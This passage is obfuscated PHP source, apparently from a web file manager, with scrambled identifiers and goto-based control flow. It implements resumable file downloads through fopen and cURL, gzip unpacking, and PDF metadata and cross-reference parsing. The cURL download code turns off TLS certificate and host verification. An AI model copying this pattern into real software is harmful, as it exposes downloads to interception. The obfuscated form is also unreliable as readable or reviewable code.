self::fileDownloadCurl($eæˆ¯Š‰Òå, $eã·¥àì´, !1, 0, $DÏÌèŠ¤‘†[$F³Îç¼®¾Ü[325]]); @unlink($d±•¹Ã¦“ñ); return $EÙ§«¤î´; } } $DÇœ¿±‘ƒà = is_file($d±•¹Ã¦“ñ) ? filesize($d±•¹Ã¦“ñ) : 0; goto aĞˆ†¡ù­; d‹ª‹ø¯ƒÖ: $F³Îç¼®¾Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!request_url_safe($eæˆ¯Š‰Òå)) { return array($F³Îç¼®¾Ü[1036] => !1, $F³Îç¼®¾Ü[1038] => $F³Îç¼®¾Ü[1041]); } $a·æÃªÅãØ = $eã·¥àì´ . $F³Îç¼®¾Ü[1519]; goto FŸ²ÛõğÒ; FÛ–Ä½‡Ã³: if (is_file($a·æÃªÅãØ)) { $C®—˜²ÆËà = file_get_contents($a·æÃªÅãØ); $F»Æ„ù¯é¶ = json_decode($C®—˜²ÆËà, 1); } if (file_exists($eã·¥àì´) && $DÑç„¡ª¯† == filesize($eã·¥àì´)) { @unlink($d±•¹Ã¦“ñ); @unlink($a·æÃªÅãØ); return array($F³Îç¼®¾Ü[1036] => !0, $F³Îç¼®¾Ü[1038] => $F³Îç¼®¾Ü[1522]); } if ($F»Æ„ù¯é¶[$F³Îç¼®¾Ü[325]] != $DÑç„¡ª¯†) { $F»Æ„ù¯é¶ = array($F³Îç¼®¾Ü[325] => $DÑç„¡ª¯†); } goto E°ë®ËŸ†³; c¡òñó¼Ùì: if ($EÙ§«¤î´[$F³Îç¼®¾Ü[1036]]) { @unlink($a·æÃªÅãØ); } return $EÙ§«¤î´; goto cˆ™¤òŒºÏ; aĞˆ†¡ù­: $DÑç„¡ª¯† = intval($DÏÌèŠ¤‘†[$F³Îç¼®¾Ü[325]]); if (file_exists($d±•¹Ã¦“ñ) && time() - filemtime($d±•¹Ã¦“ñ) < 3) { return array($F³Îç¼®¾Ü[1036] => !1, $F³Îç¼®¾Ü[1038] => $F³Îç¼®¾Ü[1521]); } $F»Æ„ù¯é¶ = array(); goto FÛ–Ä½‡Ã³; E°ë®ËŸ†³: if ($DÇœ¿±‘ƒà > $DÑç„¡ª¯†) { @unlink($d±•¹Ã¦“ñ); } file_put_contents($a·æÃªÅãØ, json_encode($F»Æ„ù¯é¶)); $EÙ§«¤î´ = self::fileDownloadCurl($eæˆ¯Š‰Òå, $eã·¥àì´, !0, $DÇœ¿±‘ƒà, $DÑç„¡ª¯†); goto c¡òñó¼Ùì; cˆ™¤òŒºÏ: } static function fileDownloadFopen($Cµ±ïä¦¬Ù, $fÊĞöÔåŞš, $FİÆÒ‹œ ° = 0) { $C¼®í¶À¾ô =& $_SERVER[´Ù×Íå‘ÄõÛ]; @ini_set($C¼®í¶À¾ô[1523], $C¼®í¶À¾ô[1524]); $B—È˜Àù¨ = $fÊĞöÔåŞš . $C¼®í¶À¾ô[1520]; set_timeout(); @unlink($B—È˜Àù¨); if ($fé«èµ›ˆÇ = @fopen($Cµ±ïä¦¬Ù, $C¼®í¶À¾ô[1525])) { goto aì•˜Û‹Š; a¾ô•‘†Æ: fclose($fé«èµ›ˆÇ); self::checkGzip($B—È˜Àù¨); if (!@rename($B—È˜Àù¨, $fÊĞöÔåŞš)) { usleep(round(rand(0, 1000) * 50)); @unlink($fÊĞöÔåŞš); $c¤Êƒ¹­İ = @rename($B—È˜Àù¨, $fÊĞöÔåŞš); if (!$c¤Êƒ¹­İ) { return array($C¼®í¶À¾ô[1036] => !1, $C¼®í¶À¾ô[1038] => $C¼®í¶À¾ô[1529]); } } goto BïÖ¯ˆ²¯„; aì•˜Û‹Š: if (!($döë¶‡Õ½‹ = @fopen($B—È˜Àù¨, $C¼®í¶À¾ô[1526]))) { return array($C¼®í¶À¾ô[1036] => !1, $C¼®í¶À¾ô[1038] => $C¼®í¶À¾ô[1527]); } while (!feof($fé«èµ›ˆÇ)) { if (!file_exists($B—È˜Àù¨)) { fclose($döë¶‡Õ½‹); return array($C¼®í¶À¾ô[1036] => !1, $C¼®í¶À¾ô[1038] => $C¼®í¶À¾ô[1528]); } clearstatcache(); if ($FİÆÒ‹œ ° > 0 && $FİÆÒ‹œ ° == filesize(iconv_system($B—È˜Àù¨))) { break; } fwrite($döë¶‡Õ½‹, fread($fé«èµ›ˆÇ, 1024 * 8), 1024 * 8); } fclose($döë¶‡Õ½‹); goto a¾ô•‘†Æ; BïÖ¯ˆ²¯„: return array($C¼®í¶À¾ô[1036] => !0, $C¼®í¶À¾ô[1038] => $C¼®í¶À¾ô[697]); goto bÆñóÌÀ­œ; bÆñóÌÀ­œ: } else { return array($C¼®í¶À¾ô[1036] => !1, $C¼®í¶À¾ô[1038] => $C¼®í¶À¾ô[1530]); } } static function fileDownloadCurl($bà”öÉŞ²‚, $BÀ¾Ì¤Õ, $AŸ–ëÎ’Äø = false, $F„¦’©×Ôñ = 0, $f¡‚Ê×ÑçÔ = 0) { goto b«Ô¬ù³¢ø; f÷ç‡ˆ´æ: curl_close($F¸Ëáå„´†); fclose($Aí¶×É›­İ); $B–›×ÂÊ¸Æ = filesize(iconv_system($F¹Â–—Â»é)); goto dê¹İ©À…â; dê¹İ©À…â: if ($B–›×ÂÊ¸Æ < $f¡‚Ê×ÑçÔ && $f¡‚Ê×ÑçÔ != 0) { return array($Bç¢“íğõø[1036] => !1, $Bç¢“íğõø[1038] => $Bç¢“íğõø[1521]); } if ($bôˆìàíÒá && filesize($F¹Â–—Â»é) != 0) { self::checkGzip($F¹Â–—Â»é); if (!@rename($F¹Â–—Â»é, $BÀ¾Ì¤Õ)) { @unlink($BÀ¾Ì¤Õ); $bôˆìàíÒá = @rename($F¹Â–—Â»é, $BÀ¾Ì¤Õ); if (!$bôˆìàíÒá) { return array($Bç¢“íğõø[1036] => !1, $Bç¢“íğõø[1038] => $Bç¢“íğõø[1533]); } } return array($Bç¢“íğõø[1036] => !0, $Bç¢“íğõø[1038] => $Bç¢“íğõø[697]); } return array($Bç¢“íğõø[1036] => !1, $Bç¢“íğõø[1038] => $Bç¢“íğõø[1534]); goto dÀ†¢‹; D¼•ïíä‰÷: if ($AŸ–ëÎ’Äø) { curl_setopt($F¸Ëáå„´†, CURLOPT_RANGE, $F„¦’©×Ôñ . $Bç¢“íğõø[716]); } curl_setopt($F¸Ëáå„´†, CURLOPT_FILE, $Aí¶×É›­İ); curl_setopt($F¸Ëáå„´†, CURLOPT_REFERER, get_url_link($bà”öÉŞ²‚)); goto Fï—œéğ…; b«Ô¬ù³¢ø: $Bç¢“íğõø =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F¹Â–—Â»é = $BÀ¾Ì¤Õ . $Bç¢“íğõø[1520]; set_timeout(); goto DåÆƒ¾°; BŒõ­’‘ÙÚ: curl_setopt($F¸Ëáå„´†, CURLOPT_NOPROGRESS, !1); curl_setopt($F¸Ëáå„´†, CURLOPT_PROGRESSFUNCTION, $Bç¢“íğõø[1532]); curl_progress_start($F¸Ëáå„´†); goto D«°å¹”¢÷; Fï—œéğ…: curl_setopt($F¸Ëáå„´†, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($F¸Ëáå„´†, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($F¸Ëáå„´†, CURLOPT_SSL_VERIFYHOST, 0); goto BŒõ­’‘ÙÚ; D«°å¹”¢÷: curl_setopt($F¸Ëáå„´†, CURLOPT_USERAGENT, $Bç¢“íğõø[1524]); $bôˆìàíÒá = curl_exec($F¸Ëáå„´†); curl_progress_end($F¸Ëáå„´†); goto f÷ç‡ˆ´æ; DåÆƒ¾°: $Aí¶×É›­İ = @fopen($F¹Â–—Â»é, $Bç¢“íğõø[984]); if (!$Aí¶×É›­İ) { return array($Bç¢“íğõø[1036] => !1, $Bç¢“íğõø[1038] => $Bç¢“íğõø[1531]); } $F¸Ëáå„´† = curl_init($bà”öÉŞ²‚); goto D¼•ïíä‰÷; dÀ†¢‹: } static function checkGzip($E­¥‘ßŠ¶) { goto FŠŠîí…Ôë; fŞÒæ¶ŸâÂ: file_put_contents($E­¥‘ßŠ¶, $DÅÖëÂ–¸™); goto EÏ¢‡Ûå‚‘; FŠŠîí…Ôë: $a²Ò®Ş£‹ = $_SERVER[´Ù×Íå‘ÄõÛ][1535]; $cëÃ´„ƒ„± = file_sub_str($E­¥‘ßŠ¶, 0, 2); if ($a²Ò®Ş£‹ != $cëÃ´„ƒ„±) { return; } goto A‰œ´‘î¼¨; A‰œ´‘î¼¨: ob_start(); readgzfile($E­¥‘ßŠ¶); $DÅÖëÂ–¸™ = ob_get_clean(); goto fŞÒæ¶ŸâÂ; EÏ¢‡Ûå‚‘: } } class FileParsePdf { public static function parse($F‹šïÕÊ¯ˆ) { goto b¶¯¤ò–‰; dÈÃ ÄöÃ«: $E·ĞŒ½¶äİ[$Có•‹ï†•Á[1537]] = StreamWrapperIO::read($F‹šïÕÊ¯ˆ, 0, $dŸ‰š¨Úß£); $E·ĞŒ½¶äİ[$Có•‹ï†•Á[1538]] = StreamWrapperIO::read($F‹šïÕÊ¯ˆ, $E·ĞŒ½¶äİ[$Có•‹ï†•Á[77]] - $dŸ‰š¨Úß£, $dŸ‰š¨Úß£); $BŠ•‚¨ÛÜ = self::decodeXref($E·ĞŒ½¶äİ); goto C®’ˆÉÍ±„; FƒÈ¿Å‚º: preg_match($C†äÚº¶£µ, $E·ĞŒ½¶äİ[$Có•‹ï†•Á[1538]], $E­éïê–õ); if (!$fôÔŠ‡…ç[$Có•‹ï†•Á[1540]] && count($E­éïê–õ) == 5) { $fôÔŠ‡…ç[$Có•‹ï†•Á[1540]] = $E­éïê–õ[3]; $fôÔŠ‡…ç[$Có•‹ï†•Á[1542]] = $E­éïê–õ[4]; } preg_match($Có•‹ï†•Á[1543], $E·ĞŒ½¶äİ[$Có•‹ï†•Á[1537]], $E­éïê–õ); goto fâ®ßó…Ø‡; d¼Êœ²·Äè: $C†äÚº¶£µ = $Có•‹ï†•Á[1541]; preg_match($C†äÚº¶£µ, $E·ĞŒ½¶äİ[$Có•‹ï†•Á[1537]], $E­éïê–õ); if (!$fôÔŠ‡…ç[$Có•‹ï†•Á[1540]] && count($E­éïê–õ) == 5) { $fôÔŠ‡…ç[$Có•‹ï†•Á[1540]] = $E­éïê–õ[3]; $fôÔŠ‡…ç[$Có•‹ï†•Á[1542]] = $E­éïê–õ[4]; } goto FƒÈ¿Å‚º; fâ®ßó…Ø‡: if ($E­éïê–õ) { $fôÔŠ‡…ç[$Có•‹ï†•Á[1346]] = $E­éïê–õ[1]; } $fôÔŠ‡…ç[$Có•‹ï†•Á[1544]] = 0; $C†äÚº¶£µ = $Có•‹ï†•Á[1545]; goto A±§ĞåÈù¬; C®’ˆÉÍ±„: if ($BŠ•‚¨ÛÜ) { $B±¨Óá³‹ = $BŠ•‚¨ÛÜ[$Có•‹ï†•Á[1539]][$Có•‹ï†•Á[1196]]; $fôÔŠ‡…ç = self::getObjectValue($E·ĞŒ½¶äİ, $BŠ•‚¨ÛÜ, $B±¨Óá³‹); } $fôÔŠ‡…ç = is_array($fôÔŠ‡…ç) ? $fôÔŠ‡…ç : array(); $fôÔŠ‡…ç[$Có•‹ï†•Á[1540]] = 0; goto d¼Êœ²·Äè; aËóä„ãßª: if ($E­éïê–õ[1] && $fôÔŠ‡…ç[$Có•‹ï†•Á[1544]] < $E­éïê–õ[1][0]) { $fôÔŠ‡…ç[$Có•‹ï†•Á[1544]] = $E­éïê–õ[1][0]; } $fôÔŠ‡…ç = self::parseInfoItem($fôÔŠ‡…ç); return $fôÔŠ‡…ç; goto B…§·áˆô; A±§ĞåÈù¬: preg_match_all($C†äÚº¶£µ, $E·ĞŒ½¶äİ[$Có•‹ï†•Á[1537]], $E­éïê–õ); if ($E­éïê–õ[1] && $fôÔŠ‡…ç[$Có•‹ï†•Á[1544]] < $E­éïê–õ[1][0]) { $fôÔŠ‡…ç[$Có•‹ï†•Á[1544]] = $E­éïê–õ[1][0]; } preg_match_all($C†äÚº¶£µ, $E·ĞŒ½¶äİ[$Có•‹ï†•Á[1538]], $E­éïê–õ); goto aËóä„ãßª; b¶¯¤ò–‰: $Có•‹ï†•Á =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dŸ‰š¨Úß£ = 32 * 1024; $E·ĞŒ½¶äİ = array($Có•‹ï†•Á[777] => fopen($F‹šïÕÊ¯ˆ, $Có•‹ï†•Á[1174]), $Có•‹ï†•Á[75] => $F‹šïÕÊ¯ˆ, $Có•‹ï†•Á[77] => filesize($F‹šïÕÊ¯ˆ), $Có•‹ï†•Á[1536] => $dŸ‰š¨Úß£); goto dÈÃ ÄöÃ«; B…§·áˆô: } private static function parseInfoItem($E—Á¾£œ¹•) { $eÆ’í¸¥Ãì =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$E—Á¾£œ¹•) { return !1; } $d¹ºó‹„à… = array($eÆ’í¸¥Ãì[1347] => array($eÆ’í¸¥Ãì[1546], $eÆ’í¸¥Ãì[33]), $eÆ’í¸¥Ãì[1547] => array($eÆ’í¸¥Ãì[1548], $eÆ’í¸¥Ãì[33]), $eÆ’í¸¥Ãì[187] => array($eÆ’í¸¥Ãì[1549], $eÆ’í¸¥Ãì[210]), $eÆ’í¸¥Ãì[107] => array($eÆ’í¸¥Ãì[1550], $eÆ’í¸¥Ãì[210]), $eÆ’í¸¥Ãì[1544] => array($eÆ’í¸¥Ãì[1544], $eÆ’í¸¥Ãì[276]), $eÆ’í¸¥Ãì[1540] => array($eÆ’í¸¥Ãì[1540], $eÆ’í¸¥Ãì[276]), $eÆ’í¸¥Ãì[1542] => array($eÆ’í¸¥Ãì[1542], $eÆ’í¸¥Ãì[276]), $eÆ’í¸¥Ãì[1551] => array($eÆ’í¸¥Ãì[1552], $eÆ’í¸¥Ãì[33]), $eÆ’í¸¥Ãì[1553] => array($eÆ’í¸¥Ãì[1554], $eÆ’í¸¥Ãì[33]), $eÆ’í¸¥Ãì[1555] => array($eÆ’í¸¥Ãì[1346], $eÆ’í¸¥Ãì[33])); $FˆàñÚ¾˜è = array(); foreach ($d¹ºó‹„à… as $fßÁìïÍ¦ => $d®ï±·¸„·) { if (!isset($E—Á¾£œ¹•[$d®ï±·¸„·[0]])) { continue; } $bå›§ÌàÛô = $E—Á¾£œ¹•[$d®ï±·¸„·[0]]; if (!$bå›§ÌàÛô || is_array($bå›§ÌàÛô)) { continue; } switch ($d®ï±·¸„·[1]) { case $eÆ’í¸¥Ãì[276]: $bå›§ÌàÛô = intval($bå›§ÌàÛô); break; case $eÆ’í¸¥Ãì[210]: if (substr($bå›§ÌàÛô, 0, 2) == $eÆ’í¸¥Ãì[1556]) { $bå›§ÌàÛô = substr($bå›§ÌàÛô, 2, 14); } if (strtotime($bå›§ÌàÛô)) { $bå›§ÌàÛô = date($eÆ’í¸¥Ãì[1557], strtotime($bå›§ÌàÛô)); } break; } $FˆàñÚ¾˜è[$fßÁìïÍ¦] = $bå›§ÌàÛô; } return $FˆàñÚ¾˜è; } private static function decodeXref(&$bÓ†ŞĞ“¦¶) { goto C¬±ïÏ³Æ±; C¬±ïÏ³Æ±: $F¢­ˆÉÖ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D¶ƒôíìŒÈ = $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[1538]]; $f¶ñ³×µ·„ = array($F¢­ˆÉÖ[1539] => array(), $F¢­ˆÉÖ[1558] => array()); goto b°¹îÍëß¼; FÍìÈ‘¤â›: if ($bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[77]] - $E©¦òÁ½ñÎ > $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[1536]]) { $b„ò‘¬›×‚ = 4 * $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[1536]]; $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[1536]] = $b„ò‘¬›×‚; $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[1537]] = StreamWrapperIO::read($bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[75]], 0, $b„ò‘¬›×‚); $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[1538]] = StreamWrapperIO::read($bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[75]], $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[77]] - $b„ò‘¬›×‚, $b„ò‘¬›×‚); $D¶ƒôíìŒÈ = $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[1538]]; } $d•ßÕˆÈùĞ = 0; preg_match_all($F¢­ˆÉÖ[1560], $D¶ƒôíìŒÈ, $d‡Œ£‰‚Çè); goto dšöé„¹İ; C‘øÎ´Åêƒ: if (preg_match($F¢­ˆÉÖ[1570], $f‡—¨‘Êò±, $d‡Œ£‰‚Çè) > 0) { $f¶ñ³×µ·„[$F¢­ˆÉÖ[1539]][$F¢­ˆÉÖ[1196]] = intval($d‡Œ£‰‚Çè[1]) . $F¢­ˆÉÖ[70] . intval($d‡Œ£‰‚Çè[2]); } if (preg_match($F¢­ˆÉÖ[1571], $f‡—¨‘Êò±, $d‡Œ£‰‚Çè) > 0) { $f¶ñ³×µ·„[$F¢­ˆÉÖ[1539]][$F¢­ˆÉÖ[367]] = array(); $f¶ñ³×µ·„[$F¢­ˆÉÖ[1539]][$F¢­ˆÉÖ[367]][0] = $d‡Œ£‰‚Çè[1]; $f¶ñ³×µ·„[$F¢­ˆÉÖ[1539]][$F¢­ˆÉÖ[367]][1] = $d‡Œ£‰‚Çè[2]; } if (!$f¶ñ³×µ·„[$F¢­ˆÉÖ[1539]][$F¢­ˆÉÖ[1196]]) { return !1; } goto aè˜…“î¤ˆ; b°¹îÍëß¼: $Dš›µÊÂ¥ç = $F¢­ˆÉÖ[1559]; if (!preg_match_all($Dš›µÊÂ¥ç, $D¶ƒôíìŒÈ, $d‡Œ£‰‚Çè, PREG_SET_ORDER, 0)) { return !1; } $E©¦òÁ½ñÎ = intval($d‡Œ£‰‚Çè[0][1]); goto FÍìÈ‘¤â›; aè˜…“î¤ˆ: if (preg_match($F¢­ˆÉÖ[1572], $f‡—¨‘Êò±, $d‡Œ£‰‚Çè) > 0) { } return $f¶ñ³×µ·„; goto e¯ëÜÀÌ˜Ş; F®Ùé‰¾¶: if (preg_match($F¢­ˆÉÖ[1565], $f‡—¨‘Êò±, $d‡Œ£‰‚Çè) > 0) { $f¶ñ³×µ·„[$F¢­ˆÉÖ[1539]][$F¢­ˆÉÖ[77]] = intval($d‡Œ£‰‚Çè[1]); } if (preg_match($F¢­ˆÉÖ[1566], $f‡—¨‘Êò±, $d‡Œ£‰‚Çè) > 0) { $f¶ñ³×µ·„[$F¢­ˆÉÖ[1539]][$F¢­ˆÉÖ[1567]] = intval($d‡Œ£‰‚Çè[1]) . $F¢­ˆÉÖ[70] . intval($d‡Œ£‰‚Çè[2]); } if (preg_match($F¢­ˆÉÖ[1568], $f‡—¨‘Êò±, $d‡Œ£‰‚Çè) > 0) { $f¶ñ³×µ·„[$F¢­ˆÉÖ[1539]][$F¢­ˆÉÖ[1569]] = intval($d‡Œ£‰‚Çè[1]) . $F¢­ˆÉÖ[70] . intval($d‡Œ£‰‚Çè[2]); } goto C‘øÎ´Åêƒ; dšöé„¹İ: foreach ($d‡Œ£‰‚Çè[3] as $b×È‰¤İÖ => $Fˆ•åŒÓõ²) { if ($d‡Œ£‰‚Çè[3][$b×È‰¤İÖ] == $F¢­ˆÉÖ[1561]) { $bêÆÎ…š‹ö = $d•ßÕˆÈùĞ . $F¢­ˆÉÖ[70] . intval($d‡Œ£‰‚Çè[2][$b×È‰¤İÖ]); $f¶ñ³×µ·„[$F¢­ˆÉÖ[1558]][$bêÆÎ…š‹ö] = intval($d‡Œ£‰‚Çè[1][$b×È‰¤İÖ]); ++$d•ßÕˆÈùĞ; } else { if ($d‡Œ£‰‚Çè[3][$b×È‰¤İÖ] == $F¢­ˆÉÖ[1562]) { ++$d•ßÕˆÈùĞ; } else { } } } if (preg_match_all($F¢­ˆÉÖ[1563], $D¶ƒôíìŒÈ, $d‡Œ£‰‚Çè)) { $DÒ½‹ôÜÜ = $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[77]] - $bÓ†ŞĞ“¦¶[$F¢­ˆÉÖ[1536]]; foreach ($d‡Œ£‰‚Çè[0] as $b×È‰¤İÖ => $E†÷±øÁÏÏ) { $b³êŠö²Ó = $d‡Œ£‰‚Çè[1][$b×È‰¤İÖ] . $F¢­ˆÉÖ[70] . $d‡Œ£‰‚Çè[2][$b×È‰¤İÖ]; $f¶ñ³×µ·„[$F¢­ˆÉÖ[1558]][$b³êŠö²Ó] = strpos($D¶ƒôíìŒÈ, $E†÷±øÁÏÏ) + $DÒ½‹ôÜÜ + 1; } } if (preg_match_all($F¢­ˆÉÖ[1564], $D¶ƒôíìŒÈ, $d‡Œ£‰‚Çè)) { $f‡—¨‘Êò± = count($d‡Œ£‰‚Çè[1]) == 1 ? $d‡Œ£‰‚Çè[1][0] : $d‡Œ£‰‚Çè[1][1]; } else { $f‡—¨‘Êò± = substr($D¶ƒôíìŒÈ, -1024 * 5); } goto F®Ùé‰¾¶; e¯ëÜÀÌ˜Ş: } private static function getObjectValue($cØÃ½¾Ó•, $D‰«÷ô®’, $Aœ®Û¡âèÅ) { goto e›”ÏáŠŒÍ; bÁÉ™ª®î: if (!is_array($BÂĞ½¨±²è[1])) { return array(); } $AÄ²éÎåË = array(); for ($EçĞÔê«¬‘ = 0; $EçĞÔê«¬‘ < count($BÂĞ½¨±²è[1]); $EçĞÔê«¬‘ += 2) { $a­Œ¬÷‘Ü = $BÂĞ½¨±²è[1][$EçĞÔê«¬‘]; $dÊ›íÆÑŞ = $BÂĞ½¨±²è[1][$EçĞÔê«¬‘ + 1]; if (count($a­Œ¬÷‘Ü) == 3 && $a­Œ¬÷‘Ü[0] == $fšİ¨Åö¦®[8]) { $a‘­œŞ÷ÔË = !1; if ($dÊ›íÆÑŞ[0] == $fšİ¨Åö¦®[1573]) { $dÊ›íÆÑŞ = self::getObject($cØÃ½¾Ó•, $D‰«÷ô®’[$fšİ¨Åö¦®[1558]][$dÊ›íÆÑŞ[1]]); } $a‘­œŞ÷ÔË = $dÊ›íÆÑŞ[1]; if ($a‘­œŞ÷ÔË === !1) { continue; } if (is_string($a‘­œŞ÷ÔË)) { $a‘­œŞ÷ÔË = self::decodeStr($a‘­œŞ÷ÔË); } $AÄ²éÎåË[$a­Œ¬÷‘Ü[1]] = $a‘­œŞ÷ÔË; } } goto BÓÍÕÃÓ¨; e›”ÏáŠŒÍ: $fšİ¨Åö¦® =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BÂĞ½¨±²è = self::getObject($cØÃ½¾Ó•, $D‰«÷ô®’[$fšİ¨Åö¦®[1558]][$Aœ®Û¡âèÅ]); if (is_string($BÂĞ½¨±²è[1])) { return $BÂĞ½¨±²è[1]; } goto bÁÉ™ª®î; BÓÍÕÃÓ¨: return $AÄ²éÎåË; goto eù•¨É­‘ê; eù•¨É­‘ê: } private static function getObject($cîµÔÚ‚ç, $CÏ¿˜›¶ÀÂ) { $BÏ„…½÷ = self::getObjectItem($cîµÔÚ‚ç, $CÏ¿˜›¶ÀÂ); $BÏ„…½÷ = self::getObjectItem($cîµÔÚ‚ç, $BÏ„…½÷[2]); return $BÏ„…½÷; } private static function getObjectItem($B†ÌïÍ”¾, $b°¶’Ë©Ÿ¡) { goto D“–·‘Äœ®; D‘·Â¥ÉÒŒ: $dÎ‹˜—‚ Ü = self::getRawObject($CÏßÙË¬½¦, $c¤ÄèĞÉìÄ); if ($b°¶’Ë©Ÿ¡ >= $f²ÊÍÖÀ—Š) { $dÎ‹˜—‚ Ü[2] = $dÎ‹˜—‚ Ü[2] + $f²ÊÍÖÀ—Š; } else { if ($b°¶’Ë©Ÿ¡ > $Fš•ŸŠëÕ && $b°¶’Ë©Ÿ¡ <= $f²ÊÍÖÀ—Š) { $dÎ‹˜—‚ Ü[2] = $dÎ‹˜—‚ Ü[2] + $b°¶’Ë©Ÿ¡; } } return $dÎ‹˜—‚ Ü; goto a¼ÇÈº«”ö; E±ö‡…ÕØ: $c¤ÄèĞÉìÄ = $b°¶’Ë©Ÿ¡ >= $f²ÊÍÖÀ—Š ? $b°¶’Ë©Ÿ¡ - $f²ÊÍÖÀ—Š : $b°¶’Ë©Ÿ¡; $CÏßÙË¬½¦ = $b°¶’Ë©Ÿ¡ >= $f²ÊÍÖÀ—Š ? $B†ÌïÍ”¾[$F„¢ ³¢¤¤[1538]] : $B†ÌïÍ”¾[$F„¢ ³¢¤¤[1537]]; if ($b°¶’Ë©Ÿ¡ > $Fš•ŸŠëÕ && $b°¶’Ë©Ÿ¡ <= $f²ÊÍÖÀ—Š) { $c¤ÄèĞÉìÄ = 0; $CÏßÙË¬½¦ = StreamWrapperIO::read($B†ÌïÍ”¾[$F„¢ ³¢¤¤[75]], $b°¶’Ë©Ÿ¡, $Fš•ŸŠëÕ); } goto D‘·Â¥ÉÒŒ; D“–·‘Äœ®: $F„¢ ³¢¤¤ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fš•ŸŠëÕ = $B†ÌïÍ”¾[$F„¢ ³¢¤¤[1536]]; $f²ÊÍÖÀ—Š = $B†ÌïÍ”¾[$F„¢ ³¢¤¤[77]] - $Fš•ŸŠëÕ; goto E±ö‡…ÕØ; a¼ÇÈº«”ö: } private static function decodeStr($E‡éÕ´–ê) { goto DßÏÛÉÎ¨Í; bæˆÜ“Ğ¾â: $E‡éÕ´–ê = $d÷ Ô‹•…‰[33]; foreach ($BÖ‡†ïÏ  as $dØí¶’¸®‡) { if (preg_match($d÷ Ô‹•…‰[1585], $dØí¶’¸®‡)) { $E‡éÕ´–ê .= \chr(hexdec(trim($dØí¶’¸®‡, $d÷ Ô‹•…‰[1586]))); } else { $E‡éÕ´–ê .= $dØí¶’¸®‡; } } $BÖ‡†ïÏ  = preg_split($d÷ Ô‹•…‰[1587], $E‡éÕ´–ê, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto fÚ’Ûó°Ú©; AÔâ¬¾†»»: $E‡éÕ´–ê = $d÷ Ô‹•…‰[33]; foreach ($BÖ‡†ïÏ  as $dØí¶’¸®‡) { if (preg_match($d÷ Ô‹•…‰[1583], $dØí¶’¸®‡)) { $E‡éÕ´–ê .= \chr(octdec(trim($dØí¶’¸®‡, $d÷ Ô‹•…‰[93]))); } else { $E‡éÕ´–ê .= $dØí¶’¸®‡; } } $BÖ‡†ïÏ  = preg_split($d÷ Ô‹•…‰[1584], $E‡éÕ´–ê, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto bæˆÜ“Ğ¾â; fÚ’Ûó°Ú©: $E‡éÕ´–ê = $d÷ Ô‹•…‰[33]; foreach ($BÖ‡†ïÏ  as $dØí¶’¸®‡) { if (preg_match($d÷ Ô‹•…‰[1588], $dØí¶’¸®‡) && !1 === stripos($dØí¶’¸®‡, $d÷ Ô‹•…‰[1589])) { $dØí¶’¸®‡ = preg_replace($d÷ Ô‹•…‰[1590], $d÷ Ô‹•…‰[33], $dØí¶’¸®‡); $dØí¶’¸®‡ = trim($dØí¶’¸®‡, $d÷ Ô‹•…‰[929]); $dØí¶’¸®‡ = pack($d÷ Ô‹•…‰[1591], $dØí¶’¸®‡); $E‡éÕ´–ê .= $dØí¶’¸®‡; } else { $E‡éÕ´–ê .= $dØí¶’¸®‡; } } if (preg_match($d÷ Ô‹•…‰[1592], $E‡éÕ´–ê)) { $eØ˜ĞğØî¤ = substr($E‡éÕ´–ê, 2); $E‡éÕ´–ê = $d÷ Ô‹•…‰[33]; $Fì™Ü¯ïÜ = strlen($eØ˜ĞğØî¤); for ($a˜‡‹ÍÏ = 0; $a˜‡‹ÍÏ < $Fì™Ü¯ïÜ; $a˜‡‹ÍÏ += 2) { $Cç§Ñ‹ÛŞù = hexdec(bin2hex(substr($eØ˜ĞğØî¤, $a˜‡‹ÍÏ, 2))); $E‡éÕ´–ê .= mb_convert_encoding($d÷ Ô‹•…‰[1593] . intval($Cç§Ñ‹ÛŞù) . $d÷ Ô‹•…‰[67], $d÷ Ô‹•…‰[1594], $d÷ Ô‹•…‰[1595]); } } goto DÌœ¼š”Æ; DÌœ¼š”Æ: return $E‡éÕ´–ê; goto c­Å‚¸îËá; DßÏÛÉÎ¨Í: $d÷ Ô‹•…‰ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E‡éÕ´–ê = str_replace(array($d÷ Ô‹•…‰[1574], $d÷ Ô‹•…‰[1575], $d÷ Ô‹•…‰[1576], $d÷ Ô‹•…‰[1577], $d÷ Ô‹•…‰[1578], $d÷ Ô‹•…‰[1579], $d÷ Ô‹•…‰[1580], $d÷ Ô‹•…‰[1581]), array($d÷ Ô‹•…‰[93], $d÷ Ô‹•…‰[50], $d÷ Ô‹•…‰[8], $d÷ Ô‹•…‰[248], $d÷ Ô‹•…‰[820], $d÷ Ô‹•…‰[217], $d÷ Ô‹•…‰[996], $d÷ Ô‹•…‰[330]), $E‡éÕ´–ê); $BÖ‡†ïÏ  = preg_split($d÷ Ô‹•…‰[1582], $E‡éÕ´–ê, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto AÔâ¬¾†»»; c­Å‚¸îËá: } private static function getRawObject($eë°»­§Œö, $B™©£šòå¯ = 0) { goto B°ó„³¾¾ö; d¬Ì–öâÔœ: $B™©£šòå¯ += strspn($eë°»­§Œö, $dˆ½Šš«‚[1596], $B™©£šòå¯); $Bæ©¥©ª” = 